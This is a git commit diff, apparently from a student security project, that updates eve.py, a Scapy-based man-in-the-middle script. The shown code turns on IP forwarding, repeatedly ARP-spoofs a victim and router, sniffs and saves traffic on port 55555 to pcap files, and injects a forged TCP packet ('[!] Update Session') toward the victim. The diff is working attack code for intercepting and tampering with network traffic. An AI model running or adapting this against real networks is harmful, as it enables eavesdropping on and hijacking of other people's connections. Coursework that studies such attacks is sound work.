a2f7514502a9b21612f3447fc0edc30e9385ca21
Shayne Preston <prests@rpi.edu>
2018-12-10 10:51:00 -0500

    Done and ready to present

--- eve.py
+++ eve.py
@@ -22,21 +22,23 @@ def Restore(routerIP, victimIP):
     send(ARP(op = 2, pdst = victimIP, psrc = routerIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count = 4)
 
 def sniffer(interface, routerIP, victimIP, eve):
-    pkts = sniff(count = 10, filter="tcp and dst port 55555" ,prn=lambda pkt: "%s: %s" % (pkt.sniffed_on, pkt.show()))
-    wrpcap("temp.pcap", pkts)
-    badPacket = IP(dst=victimIP, flags=2)/TCP(dport=55555)/"restart connection"
+    pkts = sniff(count = 25, filter="dst port 55555 or src port 55555" ,prn=lambda pkt: "%s: %s" % (pkt.sniffed_on, pkt.show()))
+    print(pkts)
+    wrpcap("sniffed.pcap", pkts)
+
+    badPacket = IP(src= victimIP, dst=victimIP)/TCP(sport=55555, dport=pkts[0].sport)/"[!] Update Session"
     send(badPacket, iface=None)
+    wrpcap("aggressive.pcap", badPacket)
 
 def MiddleMan():
     eve = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    interface = input("interface: \n") #wlp3s0
-    victimIP = input("victim: \n") #192.168.1.214
-    routerIP= input("router: \n") #192.168.1.0
+    interface = input("interface: \n") #
+    victimIP = input("victim: \n") 
+    routerIP= input("router: \n") 
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
     while 1:
         try:
             Spoof(routerIP, victimIP)
-            #time.sleep(1)
             sniffer(interface, routerIP, victimIP, eve)
             print('never escape')
         except KeyboardInterrupt:
